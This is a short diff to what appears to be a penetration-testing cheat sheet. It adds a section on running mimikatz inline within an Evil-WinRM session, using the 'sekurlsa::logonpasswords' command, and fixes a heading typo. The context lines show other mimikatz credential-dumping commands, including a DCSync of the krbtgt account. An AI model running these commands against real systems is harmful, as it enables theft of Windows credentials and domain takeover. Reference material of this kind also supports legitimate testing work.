@@ -459,7 +459,15 @@ mimikatz # lsadump::cache
 mimikatz # lsadump::dcsync /<USERNAME>:<DOMAIN>\krbtgt /domain:<DOMAIN>
 ```
 
-### Dump Hshes
+### Execute mimikatz Inline
+
+This is helpful when executing within a `Evil-WinRM` session.
+
+```c
+C:\> mimikatz.exe "sekurlsa::logonpasswords" "exit"
+```
+
+### Dump Hashes
 
 ```c
 C:\> .\mimikatz.exe
